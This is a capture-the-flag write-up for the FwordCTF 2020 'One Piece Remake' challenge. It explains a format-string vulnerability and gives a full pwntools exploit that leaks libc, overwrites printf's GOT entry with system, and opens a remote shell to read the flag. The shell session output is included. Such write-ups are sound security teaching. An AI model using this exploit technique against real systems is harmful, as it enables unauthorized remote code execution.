# FwordCTF 2020

## One Piece Remake

> 487
> 
> Luffy has learned something new.
>
> `nc onepiece.fword.wtf 1236`
>
> Author : haflout
>
> [`One Piece Remake`](one_piece_remake)

Tags: _pwn_ _x86_ _remote-shell_ _format-string_ _got-overwrite_


## Summary

Shellcode or format-string or GOT overwrite, pick your poison or two.


## Analysis

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

No mitigations in place.  Choose your own adventure.

    
### Decompile with Ghidra

```c
undefined4 mugiwara(void)
{
  char local_70 [104];
  
  puts("what\'s your name pirate ?");
  printf(">>");
  read(0,local_70,100);
  printf(local_70);
  return 0;
}
```

I went the format-string vulnerability route.  And there is it, `printf(local_70);`, and you can run it as many times as you like.

With no PIE, there's no need to leak the base address to get to the GOT, but we'll still need the libc version and location.  With that in hand, just overwrite `printf` with `system` to get a shell.


## Exploit

### Setup

> See [_Welcome Pwner Exploit Setup_](https://github.com/datajerk/ctf-write-ups/blob/master/fwordctf2020/welcome_pwner/README.md#setup) for a detailed explanation of why I start my exploits this way:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./one_piece_remake')
context.log_level = 'INFO'
context.log_file = 'log.log'

'''
# local libc
libc = binary.libc
p = process(binary.path)
'''
# task libc
libid = 'libc6_2.30-0ubuntu2.2_i386'
libpath = os.getcwd() + '/libc-database/libs/' + libid + '/'
ld = ELF(libpath + 'ld-2.30.so')
libc = ELF(libpath + 'libc-2.30.so')
#p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH': libpath})
p = remote('onepiece.fword.wtf', 1236)
#'''
```

The setup above is the final version, but before we can get there, we'll start with our local libc block, then switch to the challenge libc after discovered.

### First Pass: get libc version and location

```python
offset = 7

p.recvuntil('>>')
p.sendline('gomugomunomi')
p.recvuntil('>>')

payload  = b'%' + str(offset+1).encode() + b'$s'
payload += p32(binary.got.puts)
p.sendline(payload)

_ = p.recv(4)
puts = u32(_)
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))
```

First we need to find the `offset` of the buffer in the stack before we can use any format-string exploits.  To do this simply enter `%1$p` as your _pirate name_ incrementing the digit until the output (in hex (little endian)) matches your input.  `7` will be the `offset`.

> Read [_dead-canary_](https://github.com/datajerk/ctf-write-ups/blob/master/redpwnctf2020/dead-canary/README.md) for all the different ways to find offsets and abuse format-strings.

After finding the `offset`, use the `%s` flag to leak the location of `puts`, then compute the base of libc.

After testing locally, test remotely to get the last 3 nibbles of `puts` to then find libc using the [libc-database](https://github.com/niklasb/libc-database) (example [here](https://github.com/datajerk/ctf-write-ups/blob/master/fwordctf2020/welcome_pwner/README.md#decompile-with-ghidra)).


### Second Pass: GOT overwrite `printf` with `system`

```python
p.recvuntil('>>')
p.sendline('gomugomunomi')
p.recvuntil('>>')

payload = fmtstr_payload(offset,{binary.got.printf:libc.sym.system},numbwritten=0)
p.sendline(payload)
```

Not a lot here.  Just overwrite `printf` with `system`.


### Third Pass: get a shell, get a flag (maybe)

```python
time.sleep(0.5)
p.sendline('gomugomunomi')
time.sleep(0.5)
p.recvuntil('what\'s your name pirate ?')
p.sendline('/bin/sh')
p.interactive()
```

With `printf` taken out, we'll be flying blind, `puts` statements will make it through, but `printf` will just be `system` errors.  A few sleeps will take care of the chaos.  And with a pirate name of `/bin/sh`, well, how can we lose?

Output:

```bash
# ./exploit.py
[*] '/pwd/datajerk/fwordctf2020/one_piece_remake/one_piece_remake'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[*] '/pwd/datajerk/fwordctf2020/one_piece_remake/libc-database/libs/libc6_2.30-0ubuntu2.2_i386/ld-2.30.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/pwd/datajerk/fwordctf2020/one_piece_remake/libc-database/libs/libc6_2.30-0ubuntu2.2_i386/libc-2.30.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to onepiece.fword.wtf on port 1236: Done
[*] puts: 0xf7ddcb70
[*] libc.address: 0xf7d6b000
[*] Switching to interactive mode

$ id
uid=1000(fword) gid=1000(fword) groups=1000(fword)
$ ls -l
total 32
-rw-rw-r-- 1 root root    47 Aug 29 01:06 flag.txt
-r-x--x--x 1 root root  7656 Aug 29 01:06 one_piece_remake
-rwxr-xr-x 1 root root 18744 Aug 29 01:05 ynetd
$ cat flag.txt
```

Ummm... no flag?

```
$ grep -v blah flag.txt
FwordCTF{i_4m_G0inG_t0_B3coM3_th3_p1r4Te_K1NG}
```

Oh, there it is.

To be extra annoying, they made `cat`, `head`, `tail`, etc... useless.  Be creative.
